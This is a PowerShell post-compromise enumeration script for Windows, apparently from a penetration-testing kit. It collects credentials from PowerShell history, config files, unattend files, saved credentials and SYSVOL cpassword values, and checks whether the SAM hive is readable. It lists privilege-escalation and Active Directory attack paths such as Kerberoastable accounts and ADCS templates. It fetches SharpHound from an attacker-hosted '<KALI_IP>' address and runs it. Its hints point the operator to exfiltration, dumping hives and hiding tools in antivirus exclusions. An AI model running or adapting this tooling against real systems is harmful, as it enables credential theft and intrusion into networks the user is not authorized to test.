<#
.SYNOPSIS
    Windows post-foothold enumeration — methodology-aligned, pure read-only.

.DESCRIPTION
    On-host enumeration matching automation/recon.sh and recon.py --mode host.
    Same output layout: ./loot_<host>_<ts>/ with categorized files + summary.md.
    Pure read-only. No exploitation. No active probing. No tool downloads.
    Compatible with PowerShell 5.1 (default on Win10/11/Server 2016+).

.PARAMETER OutDir
    Output directory. Default: ./loot_<hostname>_<timestamp>/

.EXAMPLE
    powershell -ep bypass -f automation\recon.ps1
    powershell -ep bypass -f automation\recon.ps1 -OutDir C:\temp\loot

.NOTES
    Maps to windows-methodology.md Phase 3 (post-foothold) and Phase 4 (local privesc).
    For AD enumeration once domain creds are confirmed, see active-directory-methodology.md.
#>
[CmdletBinding()]
param(
    [string]$OutDir
)

$ErrorActionPreference = 'SilentlyContinue'
$ts   = Get-Date -Format 'yyyyMMdd_HHmmss'
$host_ = $env:COMPUTERNAME
if (-not $OutDir) { $OutDir = ".\loot_${host_}_${ts}" }
try { New-Item -ItemType Directory -Force -Path $OutDir | Out-Null }
catch { Write-Host "[!] cannot create $OutDir : $_" -ForegroundColor Red; exit 1 }

$findings = New-Object System.Collections.Generic.List[string]
function Hit($s)  { $findings.Add("[+] $s") | Out-Null }
function Note($s) { $findings.Add("[i] $s") | Out-Null }
function Warn($s) { $findings.Add("[!] $s") | Out-Null }

function Write-Section {
    param([string]$Path, [array]$Blocks)
    $sb = New-Object System.Text.StringBuilder
    foreach ($b in $Blocks) {
        [void]$sb.AppendLine("`n=== $($b.Title) ===")
        if ($b.Body) { [void]$sb.AppendLine($b.Body) } else { [void]$sb.AppendLine("(empty)") }
    }
    $sb.ToString() | Out-File -FilePath $Path -Encoding utf8
}

function Try-Cmd($cmd) {
    try { (& cmd /c $cmd 2>&1 | Out-String) } catch { "" }
}

# ── 1. system / identity ───────────────────────────────────────────────
$systemBlocks = @(
    @{ Title='systeminfo (top)'; Body=(systeminfo 2>$null | Select-Object -First 30 | Out-String) }
    @{ Title='hostname / domain'; Body=("$env:COMPUTERNAME`n$env:USERDOMAIN`n$env:USERDNSDOMAIN") }
    @{ Title='whoami /all'; Body=(whoami /all 2>&1 | Out-String) }
    @{ Title='whoami /priv'; Body=(whoami /priv 2>&1 | Out-String) }
    @{ Title='whoami /groups'; Body=(whoami /groups 2>&1 | Out-String) }
    @{ Title='local users'; Body=(net user 2>&1 | Out-String) }
    @{ Title='local administrators'; Body=(net localgroup Administrators 2>&1 | Out-String) }
    @{ Title='RDP / WinRM access groups'; Body=((net localgroup "Remote Desktop Users" 2>&1 | Out-String) + "`n" + (net localgroup "Remote Management Users" 2>&1 | Out-String)) }
    @{ Title='last 5 hotfixes'; Body=(Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending | Select-Object -First 5 | Format-Table -AutoSize | Out-String) }
)
Write-Section -Path "$OutDir\system.txt" -Blocks $systemBlocks

# Locale-safe systeminfo dump for WES-NG offline matching on Kali.
# `systeminfo` localizes "Hotfix(s):" header — CSV output bypasses the parse issue.
systeminfo /FO CSV 2>$null | Out-File -FilePath "$OutDir\systeminfo_csv.txt" -Encoding utf8

# ── 2. privesc primitives ──────────────────────────────────────────────
$priv = whoami /priv 2>$null | Out-String
$dangerousPrivs = @('SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege','SeBackupPrivilege',
                    'SeRestorePrivilege','SeDebugPrivilege','SeTakeOwnershipPrivilege',
                    'SeLoadDriverPrivilege','SeManageVolumePrivilege','SeMachineAccountPrivilege')
foreach ($p in $dangerousPrivs) {
    if ($priv -match "$p\s+.*Enabled") {
        Hit "$p is ENABLED — see windows-methodology.md §4.2 (token-privilege abuse)"
    }
}

$alwaysInstall = @(
    (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated,
    (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
)
if ($alwaysInstall[0] -eq 1 -and $alwaysInstall[1] -eq 1) {
    Hit "AlwaysInstallElevated is ENABLED (HKLM=1 AND HKCU=1) — instant SYSTEM via msiexec /quiet (windows-methodology.md §4.5)"
}

# Unquoted service paths (classic privesc)
$unquoted = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
    Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^[A-Z]:\\Windows\\' } |
    Select-Object Name, StartMode, State, StartName, PathName

# Service binary write check (top-level only — full ACL walk is slow)
$writableServices = New-Object System.Collections.Generic.List[object]
foreach ($svc in (Get-CimInstance Win32_Service -ErrorAction SilentlyContinue)) {
    if (-not $svc.PathName) { continue }
    $exe = ($svc.PathName -replace '"','' -split ' ')[0]
    if ($exe -and (Test-Path $exe -ErrorAction SilentlyContinue)) {
        try {
            $acl = Get-Acl $exe -ErrorAction SilentlyContinue
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match 'Everyone|Authenticated Users|Users|INTERACTIVE' -and
                    $ace.FileSystemRights -match 'Write|Modify|FullControl' -and
                    $ace.AccessControlType -eq 'Allow') {
                    $writableServices.Add([pscustomobject]@{
                        Service=$svc.Name; Path=$exe; Identity=$ace.IdentityReference; Rights=$ace.FileSystemRights
                    })
                    break
                }
            }
        } catch {}
    }
}

# UAC state
$uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue

$privescBlocks = @(
    @{ Title='whoami /priv (full)'; Body=$priv }
    @{ Title='AlwaysInstallElevated (HKLM, HKCU)'; Body=("HKLM={0}; HKCU={1}" -f $alwaysInstall[0], $alwaysInstall[1]) }
    @{ Title='Unquoted service paths (potential)'; Body=($unquoted | Format-Table -AutoSize | Out-String) }
    @{ Title='Service binaries with weak ACLs'; Body=($writableServices | Format-Table -AutoSize | Out-String) }
    @{ Title='UAC settings'; Body=("EnableLUA={0}; ConsentPromptBehaviorAdmin={1}; FilterAdministratorToken={2}" -f $uac.EnableLUA, $uac.ConsentPromptBehaviorAdmin, $uac.FilterAdministratorToken) }
    @{ Title='Stored Windows Credentials (cmdkey /list)'; Body=(cmdkey /list 2>&1 | Out-String) }
)
Write-Section -Path "$OutDir\privesc.txt" -Blocks $privescBlocks

if ($writableServices.Count -gt 0) { Hit "$($writableServices.Count) service binaries are writable by low-priv groups — service hijack candidate" }
if ($unquoted.Count -gt 0)         { Note "$($unquoted.Count) unquoted service paths with spaces — see privesc.txt" }
if ($uac.EnableLUA -eq 0)          { Hit "UAC is DISABLED (EnableLUA=0) — admin processes run elevated without prompt" }

# ── 3. scheduled tasks / startup / services ────────────────────────────
$tasksBlocks = @(
    @{ Title='scheduled tasks (non-Microsoft)'; Body=(schtasks /query /fo LIST /v 2>$null | Select-String -Pattern 'TaskName|Run As User|Task To Run' -Context 0,0 | Out-String) }
    @{ Title='startup programs (HKLM Run)'; Body=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List | Out-String) }
    @{ Title='startup programs (HKLM RunOnce)'; Body=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -ErrorAction SilentlyContinue | Format-List | Out-String) }
    @{ Title='startup programs (HKCU Run)'; Body=(Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List | Out-String) }
    @{ Title='startup folder (All Users)'; Body=(Get-ChildItem "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" -ErrorAction SilentlyContinue | Format-List | Out-String) }
    @{ Title='non-Windows running services (top 30)'; Body=(Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' -and $_.PathName -notmatch '^[A-Z]:\\Windows\\' } | Select-Object -First 30 Name,StartMode,State,StartName,PathName | Format-Table -AutoSize | Out-String) }
    @{ Title='installed software (32+64 bit)'; Body=((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName -Unique | Format-Table -AutoSize | Out-String)) }
)
Write-Section -Path "$OutDir\services.txt" -Blocks $tasksBlocks

# ── 4. credentials / config files ──────────────────────────────────────
$credPaths = @(
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)
$psHistory = Get-Content -ErrorAction SilentlyContinue $credPaths | Out-String

# Files mentioning password/secret/key (top 50)
$searchRoots = @('C:\inetpub','C:\xampp','C:\wamp','C:\Apache*','C:\Program Files','C:\Program Files (x86)','C:\Users')
$credFiles = New-Object System.Collections.Generic.List[string]
foreach ($r in $searchRoots) {
    if (Test-Path $r) {
        Get-ChildItem -Path $r -Recurse -Include '*.config','*.xml','*.ini','*.txt','*.ps1','*.bat','*.cmd','*.json','*.yml','*.yaml','web.config','unattend*.xml','sysprep*.xml' -ErrorAction SilentlyContinue |
            Select-Object -First 5000 |
            Select-String -Pattern 'password\s*=|password>|pwd=|secret\s*=|api[_-]?key|connectionString' -ErrorAction SilentlyContinue |
            ForEach-Object { $credFiles.Add("$($_.Path):$($_.LineNumber): $($_.Line.Trim())") }
        if ($credFiles.Count -ge 50) { break }
    }
}

# Unattend / sysprep files
$unattend = Get-ChildItem -Path 'C:\','C:\Windows\Panther','C:\Windows\Panther\Unattend','C:\Windows\System32\sysprep' -Recurse -Include 'unattend*.xml','sysprep*.xml','autounattend*.xml' -ErrorAction SilentlyContinue |
    Select-Object -First 20 FullName

# SAM / SYSTEM hive readability (post-Backup-priv check)
$hiveCheck = @()
foreach ($h in @('C:\Windows\System32\config\SAM','C:\Windows\System32\config\SYSTEM','C:\Windows\System32\config\SECURITY')) {
    try {
        $null = [IO.File]::OpenRead($h).Close()
        $hiveCheck += "READABLE: $h"
    } catch {
        $hiveCheck += "locked: $h"
    }
}

# Group Policy Preferences cpassword (legacy SYSVOL path) — only if domain-joined
$gppCpw = $null
if ($env:USERDNSDOMAIN) {
    $gppCpw = Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -ErrorAction SilentlyContinue |
        Select-String -Pattern 'cpassword=' -ErrorAction SilentlyContinue |
        Select-Object -First 10 Path, Line
}

$credBlocks = @(
    @{ Title='PowerShell history files'; Body=($psHistory | Out-String) }
    @{ Title='cmdkey /list (saved RDP/network creds)'; Body=(cmdkey /list 2>&1 | Out-String) }
    @{ Title='config files mentioning password/secret/key (top 50)'; Body=($credFiles -join "`n") }
    @{ Title='unattend / sysprep XML files'; Body=($unattend | Format-List | Out-String) }
    @{ Title='SAM/SYSTEM/SECURITY hive readability'; Body=($hiveCheck -join "`n") }
    @{ Title='SYSVOL GPP cpassword (legacy)'; Body=($gppCpw | Format-List | Out-String) }
    @{ Title='Web.config files (IIS app pool creds)'; Body=((Get-ChildItem 'C:\inetpub' -Recurse -Filter web.config -ErrorAction SilentlyContinue | Select-Object -First 10 FullName) -join "`n") }
)
Write-Section -Path "$OutDir\creds.txt" -Blocks $credBlocks

if ($credFiles.Count -gt 0)  { Hit "$($credFiles.Count) config files contain password/secret strings — see creds.txt" }
if ($unattend.Count -gt 0)   { Hit "unattend/sysprep XML present — often contains AdministratorPassword (creds.txt)" }
if ($gppCpw -and @($gppCpw).Count -gt 0) { Hit "SYSVOL GPP cpassword found — decrypt with gpp-decrypt (creds.txt)" }
if ($hiveCheck -match 'READABLE') { Hit "SAM/SYSTEM hives are readable — dump with reg save HKLM\SAM (windows-methodology.md §4.13)" }

# ── 5. network / pivot surface ─────────────────────────────────────────
$netBlocks = @(
    @{ Title='ipconfig /all'; Body=(ipconfig /all 2>&1 | Out-String) }
    @{ Title='route print'; Body=(route print 2>&1 | Out-String) }
    @{ Title='netstat -ano (LISTENING + ESTABLISHED)'; Body=((netstat -ano 2>&1 | Select-String -Pattern 'LISTENING|ESTABLISHED' | Out-String)) }
    @{ Title='ARP table'; Body=(arp -a 2>&1 | Out-String) }
    @{ Title='DNS cache (top 30)'; Body=(ipconfig /displaydns 2>&1 | Select-String -Pattern 'Record Name' -Context 0,0 | Select-Object -First 30 | Out-String) }
    @{ Title='SMB shares (this host)'; Body=(net share 2>&1 | Out-String) }
    @{ Title='active SMB sessions'; Body=(net session 2>&1 | Out-String) }
)
Write-Section -Path "$OutDir\network.txt" -Blocks $netBlocks

$nicCount = (Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Up' }).Count
if ($nicCount -gt 1) { Hit "$nicCount active NICs — pivot candidate (tunneling-pivoting.md)" }
$localOnly = netstat -ano 2>$null | Select-String -Pattern '127\.0\.0\.1:|0\.0\.0\.0:0' | Where-Object { $_ -match 'LISTENING' }
if ($localOnly) { Note "internal-only listening services on 127.0.0.1 — port-forward candidate" }

# ── 6. AD / domain enumeration ─────────────────────────────────────────
$inDomain = (Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).PartOfDomain
$domainFqdn = $env:USERDNSDOMAIN
$adBlocks = @(
    @{ Title='domain join state'; Body=("PartOfDomain={0}; Domain={1}; Workgroup={2}" -f $inDomain, $domainFqdn, (Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).Workgroup) }
    @{ Title='klist (current Kerberos tickets)'; Body=(klist 2>&1 | Out-String) }
    @{ Title='domain controllers (DNS SRV)'; Body=(nltest /dclist:$domainFqdn 2>&1 | Out-String) }
    @{ Title='current domain trusts'; Body=(nltest /domain_trusts 2>&1 | Out-String) }
    @{ Title='LAPS readable on this host'; Body=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\LAPS\Config' -ErrorAction SilentlyContinue | Format-List | Out-String) }
)
Write-Section -Path "$OutDir\domain.txt" -Blocks $adBlocks

if ($inDomain) {
    Hit "host is DOMAIN-JOINED ($domainFqdn) — running comprehensive AD enumeration..."
}
$tickets = klist 2>$null | Out-String
if ($tickets -match 'krbtgt|@') {
    Note "Kerberos tickets present in current session — check klist for impersonation/PtT options"
}

# ── 6b. Comprehensive read-only AD enum (only if domain-joined) ────────
if ($inDomain) {
    # ADSI / .NET DirectoryServices — works without RSAT, uses current user context
    function Get-ADSI($filter, $properties) {
        try {
            $r = New-Object DirectoryServices.DirectorySearcher
            $r.Filter = $filter
            if ($properties) { $properties | ForEach-Object { $r.PropertiesToLoad.Add($_) | Out-Null } }
            $r.PageSize = 1000
            $r.FindAll()
        } catch { $null }
    }

    # High-value group memberships
    $hvGroups = 'Domain Admins','Enterprise Admins','Schema Admins','Administrators','Account Operators','Backup Operators','Server Operators','Print Operators','DNSAdmins','Group Policy Creator Owners','Cert Publishers','Pre-Windows 2000 Compatible Access','Protected Users','Remote Desktop Users','Remote Management Users'
    $hvOutput = New-Object System.Text.StringBuilder
    foreach ($g in $hvGroups) {
        [void]$hvOutput.AppendLine("--- $g ---")
        [void]$hvOutput.AppendLine(((net group $g /domain 2>&1) | Out-String))
    }

    # ADSI queries (no RSAT required)
    $allUsers     = Get-ADSI '(&(objectCategory=user)(objectClass=user))' @('samaccountname','useraccountcontrol','description','memberof','adminCount','servicePrincipalName')
    $allComputers = Get-ADSI '(objectCategory=computer)' @('samaccountname','operatingsystem','dnshostname','useraccountcontrol')
    $kerberoastable = $allUsers | Where-Object { $_.Properties['serviceprincipalname'].Count -gt 0 -and -not ($_.Properties['samaccountname'][0] -like '*$') }
    $asrepRoastable = $allUsers | Where-Object { ($_.Properties['useraccountcontrol'][0] -band 0x400000) }   # DONT_REQ_PREAUTH
    $adminCountUsers = $allUsers | Where-Object { $_.Properties['admincount'][0] -eq 1 }
    $disabledUsers   = $allUsers | Where-Object { $_.Properties['useraccountcontrol'][0] -band 2 }
    $maq = (Get-ADSI '(objectClass=domainDNS)' @('ms-DS-MachineAccountQuota'))[0].Properties['ms-ds-machineaccountquota'][0]

    # FGPP (Fine-Grained Password Policies)
    $fgpp = Get-ADSI '(objectClass=msDS-PasswordSettings)' @('cn','msDS-PasswordSettingsPrecedence','msDS-MinimumPasswordLength','msDS-PSOAppliesTo')

    # ADCS — published CA + templates (anyone can enumerate from any domain user)
    $caObj   = Get-ADSI '(objectClass=pKIEnrollmentService)' @('name','dnshostname','certificatetemplates')
    $tplObj  = Get-ADSI '(objectClass=pKICertificateTemplate)' @('name','displayname','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pkiExtendedKeyUsage','msPKI-RA-Signature')

    # GPP cpassword sweep on \\<domain>\SYSVOL
    $gppHits = @()
    if ($domainFqdn) {
        $gppHits = Get-ChildItem "\\$domainFqdn\SYSVOL\$domainFqdn\Policies" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -ErrorAction SilentlyContinue |
                   Select-String -Pattern 'cpassword=' -ErrorAction SilentlyContinue |
                   Select-Object -First 20
    }

    # GPO list
    $gpoList = Get-ADSI '(objectCategory=groupPolicyContainer)' @('displayname','gpcfilesyspath')

    # Trusts (more verbose than nltest)
    $trustList = Get-ADSI '(objectClass=trustedDomain)' @('cn','trustpartner','trustdirection','trusttype','trustattributes')

    # Effective policies for current user
    $gpresult = (gpresult /r 2>&1 | Out-String)

    $domainEnumBlocks = @(
        @{ Title='High-value group memberships'; Body=$hvOutput.ToString() }
        @{ Title='User counts'; Body=("Total users: {0}`nDisabled users: {1}`nadminCount=1: {2}`nKerberoastable (SPN+user): {3}`nASREPRoastable (DONT_REQ_PREAUTH): {4}" -f $allUsers.Count,$disabledUsers.Count,$adminCountUsers.Count,$kerberoastable.Count,$asrepRoastable.Count) }
        @{ Title='Kerberoastable users (sAMAccountName + SPN)'; Body=(($kerberoastable | ForEach-Object { "$($_.Properties['samaccountname'][0])  SPNs: $($_.Properties['serviceprincipalname'] -join '; ')" }) -join "`n") }
        @{ Title='ASREPRoastable users'; Body=(($asrepRoastable | ForEach-Object { $_.Properties['samaccountname'][0] }) -join "`n") }
        @{ Title='adminCount=1 users (privileged or formerly so)'; Body=(($adminCountUsers | ForEach-Object { $_.Properties['samaccountname'][0] }) -join "`n") }
        @{ Title='ms-DS-MachineAccountQuota (RBCD/noPac/Certifried prereq)'; Body=("MAQ = $maq" + $(if ($maq -gt 0) { '  ← any user can create computer accounts' } else { '  ← MAQ=0; need other primitive' })) }
        @{ Title='Computer accounts (sAMAccountName + OS)'; Body=(($allComputers | Select-Object -First 100 | ForEach-Object { "$($_.Properties['samaccountname'][0])  $($_.Properties['operatingsystem'][0])" }) -join "`n") }
        @{ Title='Fine-Grained Password Policies (FGPP)'; Body=(($fgpp | ForEach-Object { "$($_.Properties['cn'][0])  precedence=$($_.Properties['msds-passwordsettingsprecedence'][0])  applies=$($_.Properties['msds-psoappliesto'] -join ';')" }) -join "`n") }
        @{ Title='ADCS — published CAs'; Body=(($caObj | ForEach-Object { "CA=$($_.Properties['name'][0])  host=$($_.Properties['dnshostname'][0])  templates=$($_.Properties['certificatetemplates'] -join ',')" }) -join "`n") }
        @{ Title='ADCS — certificate templates (look for ESC1 SAN flag)'; Body=(($tplObj | ForEach-Object { "$($_.Properties['name'][0])  display=$($_.Properties['displayname'][0])  EKU=$($_.Properties['pkiextendedkeyusage'] -join ',')  NameFlag=$($_.Properties['mspki-certificate-name-flag'][0])  EnrollFlag=$($_.Properties['mspki-enrollment-flag'][0])" }) -join "`n") }
        @{ Title='Domain trusts (LDAP)'; Body=(($trustList | ForEach-Object { "$($_.Properties['cn'][0])  partner=$($_.Properties['trustpartner'][0])  dir=$($_.Properties['trustdirection'][0])  type=$($_.Properties['trusttype'][0])  attrs=$($_.Properties['trustattributes'][0])" }) -join "`n") }
        @{ Title='SYSVOL GPP cpassword sweep'; Body=(($gppHits | Format-List | Out-String)) }
        @{ Title='GPO inventory'; Body=(($gpoList | Select-Object -First 50 | ForEach-Object { "$($_.Properties['displayname'][0])  path=$($_.Properties['gpcfilesyspath'][0])" }) -join "`n") }
        @{ Title='gpresult /r (effective policies on this user)'; Body=$gpresult }
    )
    Write-Section -Path "$OutDir\domain_enum.txt" -Blocks $domainEnumBlocks

    # Findings rollup
    if ($maq -gt 0)                             { Hit "MachineAccountQuota = $maq — RBCD/noPac/Certifried primitive available" }
    if ($kerberoastable.Count -gt 0)            { Hit "$($kerberoastable.Count) Kerberoastable accounts found (see domain_enum.txt) — Rubeus.exe kerberoast / impacket-GetUserSPNs" }
    if ($asrepRoastable.Count -gt 0)            { Hit "$($asrepRoastable.Count) ASREPRoastable accounts found — impacket-GetNPUsers <DOM>/ -no-pass -usersfile <list>" }
    if ($caObj.Count -gt 0)                     { Hit "ADCS CA published — run certipy find -vulnerable for ESC1-16 (active-directory-methodology.md Phase 6/7)" }
    if ($gppHits -and @($gppHits).Count -gt 0)  { Hit "SYSVOL GPP cpassword present — gpp-decrypt the value (creds.txt + domain_enum.txt)" }
    $isProtUsersMember = (whoami /groups 2>&1 | Select-String -Quiet 'Protected Users')
    if ($isProtUsersMember)                     { Note "Current user is in Protected Users — limits Kerberos delegation, no NTLM, no DES/RC4 tickets" }

    # ── 6c. BloodHound auto-collect via SharpHound CE ───────────────────
    # Resolution order for SharpHound.exe (host it on Kali — recommended for exam):
    #   1. $env:SHARPHOUND_URL    (HTTP URL preferred; SMB UNC fallback; local path also OK)
    #   2. SharpHound.exe in current directory   (drop next to recon.ps1)
    #   3. SharpHound.exe in PATH                (rare on locked-down hosts)
    #
    # Kali bundles SharpHound at /usr/share/bloodhound-ce/collectors/SharpHound.exe.
    # Host it via HTTP (simplest, most likely to work through proxies/firewalls):
    #   sudo python3 -m http.server 80 --directory /usr/share/bloodhound-ce/collectors
    #   Then on target:  $env:SHARPHOUND_URL = 'http://<KALI_IP>/SharpHound.exe'
    #
    # SMB fallback (use only if HTTP egress is blocked but SMB allowed):
    #   smbserver.py -smb2support sh /usr/share/bloodhound-ce/collectors
    #   Then on target:  $env:SHARPHOUND_URL = '\\<KALI_IP>\sh\SharpHound.exe'
    $bhDir = Join-Path $OutDir 'bloodhound'
    New-Item -ItemType Directory -Force -Path $bhDir | Out-Null
    $bhRun = Join-Path $bhDir 'run.log'
    $bhLog = New-Object System.Text.StringBuilder

    $sh = $null
    $shSource = $env:SHARPHOUND_URL
    if (-not $shSource) {
        $local = Join-Path (Get-Location) 'SharpHound.exe'
        if (Test-Path $local) { $sh = $local }
        else {
            $cmd = Get-Command SharpHound.exe -ErrorAction SilentlyContinue
            if ($cmd) { $sh = $cmd.Source }
        }
    }

    # Fetch from URL or UNC if supplied
    if (-not $sh -and $shSource) {
        $shLocal = Join-Path $bhDir 'SharpHound.exe'
        try {
            if ($shSource -match '^https?://') {
                [void]$bhLog.AppendLine("[i] Fetching SharpHound from $shSource")
                Invoke-WebRequest -Uri $shSource -OutFile $shLocal -UseBasicParsing -TimeoutSec 60
            } elseif ($shSource -match '^\\\\') {
                [void]$bhLog.AppendLine("[i] Copying SharpHound from $shSource (SMB UNC)")
                Copy-Item -Path $shSource -Destination $shLocal -Force
            } else {
                [void]$bhLog.AppendLine("[i] Treating SHARPHOUND_URL as local path: $shSource")
                if (Test-Path $shSource) { $shLocal = $shSource } else { throw "not found: $shSource" }
            }
            if (Test-Path $shLocal) { $sh = $shLocal }
        } catch {
            [void]$bhLog.AppendLine("[!] Fetch failed: $_")
        }
    }

    if ($sh -and (Test-Path $sh)) {
        [void]$bhLog.AppendLine("[+] Running SharpHound CE: $sh")
        try {
            $shOut = & $sh -c All --zipfilename "bh.zip" --outputdirectory $bhDir 2>&1 | Out-String
            [void]$bhLog.AppendLine($shOut)
            $bhZip = Get-ChildItem $bhDir -Filter 'bh*.zip' | Select-Object -First 1
            if ($bhZip) {
                Hit "BloodHound ZIP collected: $($bhZip.FullName) — import into BloodHound CE UI"
            } else {
                Note "SharpHound ran but no ZIP produced — see bloodhound\run.log"
            }
        } catch {
            [void]$bhLog.AppendLine("[!] SharpHound execution failed: $_")
            Note "BloodHound NOT collected — see bloodhound\run.log"
        }
    } else {
        [void]$bhLog.AppendLine("[!] No SharpHound.exe found.")
        [void]$bhLog.AppendLine("    Recommended: host it on Kali, then re-run with the URL/UNC:")
        [void]$bhLog.AppendLine("      `$env:SHARPHOUND_URL = 'http://<KALI_IP>/SharpHound.exe'")
        [void]$bhLog.AppendLine("      OR:  `$env:SHARPHOUND_URL = '\\\\<KALI_IP>\\sh\\SharpHound.exe'")
        [void]$bhLog.AppendLine("    Kali side:")
        [void]$bhLog.AppendLine("      sudo python3 -m http.server 80 --directory /usr/share/bloodhound-ce/collectors")
        [void]$bhLog.AppendLine("      OR:  smbserver.py -smb2support sh /usr/share/bloodhound-ce/collectors")
        [void]$bhLog.AppendLine("    Manual:  SharpHound.exe -c All --zipfilename bh.zip --outputdirectory $bhDir")
        Note "BloodHound NOT collected — host SharpHound on Kali (see bloodhound\run.log)"
    }
    $bhLog.ToString() | Out-File -FilePath $bhRun -Encoding utf8
}

# ── 7. AV / EDR / Defender ─────────────────────────────────────────────
$defStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
$defPref   = Get-MpPreference -ErrorAction SilentlyContinue
$avBlocks = @(
    @{ Title='Defender status'; Body=($defStatus | Format-List | Out-String) }
    @{ Title='Defender exclusions'; Body=("Paths:`n{0}`n`nProcesses:`n{1}`n`nExtensions:`n{2}" -f ($defPref.ExclusionPath -join "`n"), ($defPref.ExclusionProcess -join "`n"), ($defPref.ExclusionExtension -join "`n")) }
    @{ Title='installed AV products'; Body=(Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Format-List | Out-String) }
    @{ Title='EDR processes (heuristic name match)'; Body=((Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'msmpeng|sense|carbonblack|cb|cylance|crowdstrike|csagent|elastic|sentinel|cortex|trend|mcafee|sophos|defender|tanium' }) | Format-Table -AutoSize | Out-String) }
)
Write-Section -Path "$OutDir\av.txt" -Blocks $avBlocks

if ($defPref.ExclusionPath)    { Hit "Defender path exclusions defined — drop tooling there (av.txt)" }
if ($defStatus.RealTimeProtectionEnabled -eq $false) { Hit "Defender real-time protection is DISABLED" }
if ($defStatus.AMServiceEnabled -eq $false)          { Hit "Defender AM service is DISABLED" }

# ── 8. interesting installed apps / SCCM / WSUS ────────────────────────
$wsusServer = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' -ErrorAction SilentlyContinue).WUServer
$sccmSite   = (Get-WmiObject -Namespace 'root\ccm' -Class SMS_Authority -ErrorAction SilentlyContinue).Name
$appsBlocks = @(
    @{ Title='WSUS server (HTTP = vulnerable to wsuxploit; HTTPS check 4.7.2)'; Body=($wsusServer) }
    @{ Title='SCCM site authority'; Body=($sccmSite) }
    @{ Title='SCCM client cache'; Body=(Get-ChildItem 'C:\Windows\ccmcache' -ErrorAction SilentlyContinue | Select-Object -First 20 Name | Out-String) }
)
Write-Section -Path "$OutDir\apps.txt" -Blocks $appsBlocks

if ($wsusServer -and $wsusServer -match '^http://') {
    Hit "WSUS configured over HTTP ($wsusServer) — wsuxploit candidate (windows-methodology.md §4.7.2)"
}
if ($sccmSite) {
    Note "SCCM client active (site=$sccmSite) — check NAA / client push (active-directory-methodology.md Phase 13)"
}

# ── findings + summary ────────────────────────────────────────────────
$findings | Out-File -FilePath "$OutDir\findings.txt" -Encoding utf8

$summary = @(
    "# Windows post-foothold loot — $host_ @ $ts"
    ""
    "## Priority findings (read first)"
    ""
    if ($findings.Count -gt 0) { $findings -join "`n" } else { "(none flagged automatically — review files)" }
    ""
    "## Files"
    ""
    (Get-ChildItem $OutDir | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize | Out-String)
    ""
    "## Methodology cross-refs"
    "- systeminfo_csv.txt → exfil to Kali, run: wes.py systeminfo_csv.txt -e -i 'Important' (WES-NG patch-aware LPE matching)"
    "- privesc.txt   → windows-methodology.md §4 (Local Privilege Escalation)"
    "- creds.txt     → windows-methodology.md §4.7 (Stored Credentials), §4.15 (DPAPI)"
    "- services.txt  → windows-methodology.md §4.3 (Service Misconfigs), §4.6 (Scheduled Tasks)"
    "- network.txt   → tunneling-pivoting.md (pivot opportunities)"
    "- domain.txt    → active-directory-methodology.md (Phase 1-2 reference)"
    $(if (Test-Path "$OutDir\domain_enum.txt") { "- domain_enum.txt → AD comprehensive read-only enum (HV groups, Kerberoastable, ADCS templates, GPP cpassword, FGPP, gpresult)" })
    $(if (Test-Path "$OutDir\bloodhound") { "- bloodhound\   → SharpHound CE ZIP (import into BloodHound CE UI) or manual cmd in run.log" })
    "- av.txt        → av-evasion.md (Defender exclusions, EDR identification)"
    "- apps.txt      → active-directory-methodology.md Phase 13/14 (SCCM, WSUS)"
) -join "`n"
$summary | Out-File -FilePath "$OutDir\summary.md" -Encoding utf8

Write-Host "[+] loot dir: $OutDir"
Write-Host "[+] priority findings:"
if ($findings.Count -gt 0) {
    foreach ($f in $findings) { Write-Host "    $f" }
} else {
